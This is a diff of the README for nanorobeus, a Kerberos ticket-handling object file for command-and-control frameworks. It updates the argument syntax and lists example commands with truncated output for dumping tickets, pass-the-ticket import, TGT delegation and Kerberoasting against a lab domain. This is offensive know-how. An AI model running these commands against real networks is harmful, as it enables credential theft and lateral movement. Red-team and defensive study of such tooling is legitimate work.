@@ -4,25 +4,24 @@ COFF file (BOF) for managing Kerberos tickets.
 ## Supported agents
 * [Sliver](https://github.com/BishopFox/sliver)
 * [Brute Ratel](https://bruteratel.com)
-* Any other agent supporting Cobalt Strike BOFs (not tested)
-
+* [Cobalt Strike](https://www.cobaltstrike.com)
 ## Commands
 
 **luid** - get current logon ID
 
-**sessions** *[/luid <0x0>| /all]* - get logon sessions
+**sessions** *[/luid:<0x0>| /all]* - get logon sessions
 
-**klist** *[/luid <0x0> | /all]* - list Kerberos tickets
+**klist** *[/luid:<0x0> | /all]* - list Kerberos tickets
 
-**dump** *[/luid <0x0> | /all]* - dump Kerberos tickets
+**dump** *[/luid:<0x0> | /all]* - dump Kerberos tickets
 
-**ptt** *\<base64\> [/luid <0x0>]* - import Kerberos ticket into a logon session
+**ptt** */ticket:\<base64\> [/luid:<0x0>]* - import Kerberos ticket into a logon session
 
-**purge** *[/luid <0x0>]* - purge Kerberos tickets
+**purge** *[/luid:<0x0>]* - purge Kerberos tickets
 
-**tgtdeleg** *\<spn\>* - retrieve a usable TGT for the current user
+**tgtdeleg** *\/spn:<spn\>* - retrieve a usable TGT for the current user
 
-**kerberoast** *\<spn\>* - perform Kerberoasting against specified SPN
+**kerberoast** *\/spn:<spn\>* - perform Kerberoasting against specified SPN
 
 ## Examples
 Get current logon ID.
@@ -47,7 +46,7 @@ LogonServer             : SERVER
 LogonServerDNSDomain    : FORTRESS.LOCAL
 UserPrincipalName       : user@fortress.local
 ```
-List Kerberos tickets for the current logon session. When elevated, use `/all` to list tickets from all of the sessions or `/luid 0x0` to list tickets in a specified logon session.
+List Kerberos tickets for the current logon session. When elevated, use `/all` to list tickets from all of the sessions or `/luid:0x0` to list tickets in a specified logon session.
 ```
 => nanorobeus64 klist
 
@@ -75,7 +74,7 @@ UserPrincipalName       : user@fortress.local
 	Encryption type : AES256_CTS_HMAC_SHA1
     ...(snip)...
 ```
-Dump tickets from the current logon session. When elevated, use `/all` to dump tickets from all of the sessions or `/luid 0x0` to dump tickets from a specified logon session.
+Dump tickets from the current logon session. When elevated, use `/all` to dump tickets from all of the sessions or `/luid:0x0` to dump tickets from a specified logon session.
 ```
 => nanorobeus64 dump
 
@@ -103,14 +102,14 @@ UserPrincipalName       : user@fortress.local
 	Encryption type : AES256_CTS_HMAC_SHA1
 	Ticket          : doIFFjCCBRKgAwIBBaEDAgEWooIEGTCCBBVhggQRMIIEDaADAg...(snip)...
 ```
-Import a ticket into the current logon session. When elevated, use `/luid 0x0` to import the ticket into a specified logon session.
+Import a ticket into the current logon session. When elevated, use `/luid:0x0` to import the ticket into a specified logon session.
 ```
 => make_token network fortress.local test pass
-=> nanorobeus64 ptt doIFqjCCBaagAwIB...snip...
+=> nanorobeus64 ptt /ticket:doIFqjCCBaagAwIB...snip...
 
 [+] Ticket successfully imported.
 ```
-Purge all Kerberos tickets from the current logon session. When elevated, use `/luid 0x0` to purge the tickets from a specified logon session.
+Purge all Kerberos tickets from the current logon session. When elevated, use `/luid:0x0` to purge the tickets from a specified logon session.
 ```
 => nanorobeus64 purge
 
@@ -118,7 +117,7 @@ Purge all Kerberos tickets from the current logon session. When elevated, use `/
 ```
 Retrieve a usable TGT for the current user.
 ```
-=> nanorobeus64 tgtdeleg cifs/server.fortress.local
+=> nanorobeus64 tgtdeleg /spn:cifs/server.fortress.local
 
 [*] Found the AP-REQ delegation ticket in the GSS-API output
 [*] Authenticator etype: AES256_CTS_HMAC_SHA1
@@ -128,7 +127,7 @@ Retrieve a usable TGT for the current user.
 ```
 Perform Kerberoasting by specifying SPN:
 ```
-=> nanorobeus64 kerberoast HTTP/server.fortress.local
+=> nanorobeus64 kerberoast /spn:HTTP/server.fortress.local
 
 [*] Target SPN: HTTP/server.fortress.local
 [+] Hash: $krb5tgs$23$*$FORTRESS.LOCAL$HTTP/server.fortress.local*$ac5e2f4d28fd377...(snip)...
